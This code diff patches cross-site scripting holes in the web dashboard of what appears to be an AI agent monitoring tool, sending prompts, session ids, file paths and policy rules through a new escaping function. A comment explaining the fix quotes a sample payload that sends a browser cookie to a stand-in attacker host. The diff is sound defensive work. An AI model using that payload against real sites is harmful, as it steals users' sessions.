@@ -563,6 +563,31 @@ mv .claude/settings.json .claude/settings.json.dredd-off
     let sessionsData = [];
     let currentDetailSessionId = null;
 
+    // ------------------------------------------------------------------
+    // HTML escaping.
+    //
+    // Every user-controlled string (prompts, tool inputs, file paths,
+    // reasons) must go through esc() before being embedded via innerHTML
+    // or template strings. Without this, a user's prompt can execute
+    // JavaScript in any operator's browser:
+    //
+    //   prompt = 'fix <img src=x onerror="fetch(\'//attacker/\'+cookie)">'
+    //
+    // textContent contexts are safe; innerHTML contexts are not.
+    //
+    // The session_id is additionally validated at the server (see
+    // SESSION_ID_PATTERN in server.ts) so it cannot break out of the
+    // JS-string context in inline onclick handlers.
+    // ------------------------------------------------------------------
+    function esc(s) {
+      return String(s ?? '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+    }
+
     function renderFeedRow(f, opts) {
       const time = new Date(f.timestamp).toLocaleTimeString();
       const cls = f.allowed === false ? 'feed-deny' : f.type === 'intent' ? 'feed-intent' : 'feed-allow';
@@ -571,7 +596,6 @@ mv .claude/settings.json .claude/settings.json.dredd-off
       // keep the turn/classification string as a trailing stage-style annotation.
       const isIntent = f.type === 'intent';
       const msg = isIntent ? (f.prompt ?? f.reason ?? '') : (f.reason ?? f.prompt ?? '');
-      const esc = (s) => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
       const msgEsc = esc(msg);
       const stageText = isIntent ? (f.reason ?? '') : (f.stage ?? '');
       const stageHtml = stageText ? `<span class="muted">[${esc(stageText)}]</span> ` : '';
@@ -579,9 +603,9 @@ mv .claude/settings.json .claude/settings.json.dredd-off
       const sidShort = sid ? (sid.length > 8 ? sid.substring(0, 8) : sid) : '';
       const showSid = opts && opts.showSessionId !== false;
       const sidHtml = showSid && sid
-        ? `<span class="feed-sid cell-link muted" title="${sid}" onclick="showDetail('${sid}')">${sidShort}</span> `
+        ? `<span class="feed-sid cell-link muted" title="${esc(sid)}" onclick="showDetail('${esc(sid)}')">${esc(sidShort)}</span> `
         : '';
-      return `<div class="feed-entry"><span class="feed-time">${time}</span> ${sidHtml}<span class="${cls}">${icon}</span> <span class="feed-tool">${f.tool ?? f.type ?? ''}</span> ${stageHtml}<span class="muted" title="${msgEsc}">${msgEsc}</span></div>`;
+      return `<div class="feed-entry"><span class="feed-time">${time}</span> ${sidHtml}<span class="${cls}">${icon}</span> <span class="feed-tool">${esc(f.tool ?? f.type ?? '')}</span> ${stageHtml}<span class="muted" title="${msgEsc}">${msgEsc}</span></div>`;
     }
 
     // Populate the "Integrate" tab URL hints so users can see which judge
@@ -666,13 +690,13 @@ mv .claude/settings.json .claude/settings.json.dredd-off
       const tools = getAllTools(s);
       if (tools.length === 0) {
         const count = s.summary?.toolCalls ?? 0;
-        return count > 0 ? `<div class="tip-title">${count} tool calls (detail not recorded)</div>` : '';
+        return count > 0 ? `<div class="tip-title">${esc(count)} tool calls (detail not recorded)</div>` : '';
       }
       const counts = {};
       tools.forEach(t => { counts[t.tool] = (counts[t.tool] || 0) + 1; });
       const rows = Object.entries(counts)
         .sort((a, b) => b[1] - a[1])
-        .map(([tool, count]) => `<div class="tip-item">${tool}: ${count}</div>`)
+        .map(([tool, count]) => `<div class="tip-item">${esc(tool)}: ${esc(count)}</div>`)
         .join('');
       return `<div class="tip-title">Tools Used</div><div class="tip-list">${rows}</div>`;
     }
@@ -683,14 +707,15 @@ mv .claude/settings.json .claude/settings.json.dredd-off
       const deniedCount = s.summary?.denied ?? 0;
 
       if (denied.length === 0 && deniedCount > 0) {
-        return `<div class="tip-title">${deniedCount} Denied Calls</div><div class="tip-item muted">Detail not recorded in this session log</div>`;
+        return `<div class="tip-title">${esc(deniedCount)} Denied Calls</div><div class="tip-item muted">Detail not recorded in this session log</div>`;
       }
       if (denied.length === 0) return '<div class="tip-title">No Denied Calls</div>';
 
       const rows = denied
         .map(t => {
           const detail = t.reason ? t.reason.substring(0, 60) : (JSON.stringify(t.input) || '').substring(0, 60);
-          return `<div class="tip-item denied">${t.tool}${t.stage ? ' [' + t.stage + ']' : ''} — ${detail}</div>`;
+          const stageHtml = t.stage ? ' [' + esc(t.stage) + ']' : '';
+          return `<div class="tip-item denied">${esc(t.tool)}${stageHtml} — ${esc(detail)}</div>`;
         })
         .join('');
       return `<div class="tip-title">Denied (${denied.length})</div><div class="tip-list">${rows}</div>`;
@@ -699,7 +724,7 @@ mv .claude/settings.json .claude/settings.json.dredd-off
     function buildFileTip(files) {
       if (!files || files.length === 0) return '<div class="tip-title">No Files Written</div>';
       const rows = files
-        .map(f => `<div class="tip-item ${f.containsCanary ? 'denied' : 'allowed'}">${f.path} (${f.writeCount}x)${f.containsCanary ? ' CANARY' : ''}</div>`)
+        .map(f => `<div class="tip-item ${f.containsCanary ? 'denied' : 'allowed'}">${esc(f.path)} (${esc(f.writeCount)}x)${f.containsCanary ? ' CANARY' : ''}</div>`)
         .join('');
       return `<div class="tip-title">Files Written</div><div class="tip-list">${rows}</div>`;
     }
@@ -742,15 +767,17 @@ mv .claude/settings.json .claude/settings.json.dredd-off
             const fileTip = buildFileTip(s.filesWritten);
 
             const sidShort = sid ? (sid.length > 8 ? sid.substring(0, 8) : sid) : '';
+            const sidEsc = esc(sid);
+            const classEsc = esc(classification);
             return `<tr>
               <td class="mono muted">${time}</td>
-              <td class="mono muted cell-link" title="${sid}" onclick="showDetail('${sid}')">${sidShort}</td>
-              <td class="task-text cell-link" title="${(s.originalTask??'').replace(/"/g,'&quot;')}" onclick="showDetail('${sid}')">${task}</td>
+              <td class="mono muted cell-link" title="${sidEsc}" onclick="showDetail('${sidEsc}')">${esc(sidShort)}</td>
+              <td class="task-text cell-link" title="${esc(s.originalTask ?? '')}" onclick="showDetail('${sidEsc}')">${esc(task)}</td>
               <td style="text-align:center">${s.summary?.turns ?? 0}</td>
-              <td style="text-align:center" class="tooltip"><span class="cell-link" onclick="showDetail('${sid}','tools')">${tools}</span><div class="tip">${toolTip || 'No tools'}</div></td>
-              <td style="text-align:center" class="tooltip"><span class="cell-link" onclick="showDetail('${sid}','denied')">${denied > 0 ? `<span class="badge badge-deny">${denied}</span>` : '0'}</span><div class="tip">${deniedTip}</div></td>
-              <td style="text-align:center" class="tooltip"><span class="cell-link" onclick="showDetail('${sid}','files')">${files}</span><div class="tip">${fileTip}</div></td>
-              <td style="text-align:center"><span class="badge badge-${classification}">${classification}</span></td>
+              <td style="text-align:center" class="tooltip"><span class="cell-link" onclick="showDetail('${sidEsc}','tools')">${tools}</span><div class="tip">${toolTip || 'No tools'}</div></td>
+              <td style="text-align:center" class="tooltip"><span class="cell-link" onclick="showDetail('${sidEsc}','denied')">${denied > 0 ? `<span class="badge badge-deny">${denied}</span>` : '0'}</span><div class="tip">${deniedTip}</div></td>
+              <td style="text-align:center" class="tooltip"><span class="cell-link" onclick="showDetail('${sidEsc}','files')">${files}</span><div class="tip">${fileTip}</div></td>
+              <td style="text-align:center"><span class="badge badge-${classEsc}">${classEsc}</span></td>
             </tr>`;
           }).join('');
         }
@@ -817,25 +844,29 @@ mv .claude/settings.json .claude/settings.json.dredd-off
         const tools = data.toolHistory ?? data.interceptorLog ?? [];
         document.getElementById('detail-tools').innerHTML = tools.length === 0
           ? '<tr><td colspan="5" class="empty">No tool calls recorded</td></tr>'
-          : tools.map(t => `<tr>
-              <td>${t.turn ?? t.turnNumber ?? '-'}</td>
-              <td class="mono">${t.tool}</td>
-              <td><span class="badge badge-${t.decision === 'deny' || t.allowed === false ? 'deny' : 'allow'}">${t.decision ?? (t.allowed ? 'allow' : 'deny')}</span> ${t.stage ? `<span class="muted">${t.stage}</span>` : ''}</td>
-              <td class="mono">${t.similarity !== null && t.similarity !== undefined ? t.similarity.toFixed(3) : '-'}</td>
-              <td class="mono muted" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${JSON.stringify(t.input ?? '').substring(0, 80)}</td>
-            </tr>`).join('');
+          : tools.map(t => {
+              const decision = t.decision ?? (t.allowed ? 'allow' : 'deny');
+              const badgeCls = t.decision === 'deny' || t.allowed === false ? 'deny' : 'allow';
+              return `<tr>
+                <td>${esc(t.turn ?? t.turnNumber ?? '-')}</td>
+                <td class="mono">${esc(t.tool)}</td>
+                <td><span class="badge badge-${esc(badgeCls)}">${esc(decision)}</span> ${t.stage ? `<span class="muted">${esc(t.stage)}</span>` : ''}</td>
+                <td class="mono">${t.similarity !== null && t.similarity !== undefined ? t.similarity.toFixed(3) : '-'}</td>
+                <td class="mono muted" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(JSON.stringify(t.input ?? '').substring(0, 80))}</td>
+              </tr>`;
+            }).join('');
 
         // Turn metrics
         const turns = data.turnMetrics ?? data.summary?.turnMetrics ?? [];
         document.getElementById('detail-turns').innerHTML = turns.length === 0
           ? '<tr><td colspan="7" class="empty">No turn metrics</td></tr>'
           : turns.map(t => `<tr>
-              <td>${t.turnNumber}</td>
+              <td>${esc(t.turnNumber)}</td>
               <td class="mono muted">${t.timestamp ? new Date(t.timestamp).toLocaleTimeString() : '-'}</td>
-              <td><span class="badge badge-${t.classification}">${t.classification}</span></td>
+              <td><span class="badge badge-${esc(t.classification)}">${esc(t.classification)}</span></td>
               <td class="mono">${t.driftFromOriginal !== null ? t.driftFromOriginal.toFixed(3) : '-'}</td>
-              <td>${t.toolCallCount}</td>
-              <td>${t.toolCallsDenied > 0 ? `<span class="badge badge-deny">${t.toolCallsDenied}</span>` : '0'}</td>
+              <td>${esc(t.toolCallCount)}</td>
+              <td>${t.toolCallsDenied > 0 ? `<span class="badge badge-deny">${esc(t.toolCallsDenied)}</span>` : '0'}</td>
               <td>${t.goalReminderInjected ? '✓' : ''}</td>
             </tr>`).join('');
 
@@ -843,13 +874,17 @@ mv .claude/settings.json .claude/settings.json.dredd-off
         const intents = data.intentHistory ?? data.summary?.intents ?? [];
         document.getElementById('detail-intents').innerHTML = intents.length === 0
           ? '<div class="empty">No intents recorded</div>'
-          : intents.map((intent, i) => `<div style="padding:6px 0;border-bottom:1px solid var(--border)"><span class="badge badge-allow">Turn ${intent.turn ?? i}</span> ${typeof intent === 'string' ? intent : intent.intent ?? ''}</div>`).join('');
+          : intents.map((intent, i) => {
+              const turnLabel = esc(intent.turn ?? i);
+              const text = typeof intent === 'string' ? intent : (intent.intent ?? '');
+              return `<div style="padding:6px 0;border-bottom:1px solid var(--border)"><span class="badge badge-allow">Turn ${turnLabel}</span> ${esc(text)}</div>`;
+            }).join('');
 
         // Files
         const files = data.filesWritten ?? [];
         document.getElementById('detail-files').innerHTML = files.length === 0
           ? '<div class="empty">No files written</div>'
-          : files.map(f => `<div style="padding:6px 0;border-bottom:1px solid var(--border)"><span class="mono">${f.path}</span> <span class="muted">(${f.writeCount}x)</span>${f.containsCanary ? ' <span class="badge badge-deny">CANARY</span>' : ''}</div>`).join('');
+          : files.map(f => `<div style="padding:6px 0;border-bottom:1px solid var(--border)"><span class="mono">${esc(f.path)}</span> <span class="muted">(${esc(f.writeCount)}x)</span>${f.containsCanary ? ' <span class="badge badge-deny">CANARY</span>' : ''}</div>`).join('');
 
         // Raw
         document.getElementById('detail-raw').textContent = JSON.stringify(data, null, 2);
@@ -889,7 +924,7 @@ mv .claude/settings.json .claude/settings.json.dredd-off
         const sel = document.getElementById('log-select');
         const prev = sel.value;
         sel.innerHTML = '<option value="">Select a log file...</option>' +
-          files.map(f => `<option value="${f}">${f}</option>`).join('');
+          files.map(f => `<option value="${esc(f)}">${esc(f)}</option>`).join('');
         if (prev && files.includes(prev)) { sel.value = prev; }
         else if (files.length > 0) { sel.value = files[0]; }
         if (sel.value) loadLogContent();
@@ -930,15 +965,15 @@ mv .claude/settings.json .claude/settings.json.dredd-off
 
         const renderGroup = (title, rules, cls) => {
           const id = title.replace(/\s+/g, '-').toLowerCase();
-          return `<div class="policy-group ${cls}">
+          return `<div class="policy-group ${esc(cls)}">
             <div class="policy-group-header" onclick="this.nextElementSibling.classList.toggle('open')">
-              <span>${title}</span>
+              <span>${esc(title)}</span>
               <span class="pg-count">${rules.length}</span>
             </div>
             <div class="policy-rules">
               ${rules.map(r => `<div class="policy-rule">
-                <span class="rule-pattern">${r.pattern}</span>
-                <span class="rule-reason">${r.reason}</span>
+                <span class="rule-pattern">${esc(r.pattern)}</span>
+                <span class="rule-reason">${esc(r.reason)}</span>
               </div>`).join('')}
             </div>
           </div>`;
@@ -955,7 +990,7 @@ mv .claude/settings.json .claude/settings.json.dredd-off
 
       } catch (err) {
         document.getElementById('policy-rules').innerHTML =
-          `<div class="empty">Failed to load policies: ${err.message}</div>`;
+          `<div class="empty">Failed to load policies: ${esc(err.message)}</div>`;
       }
     }
 
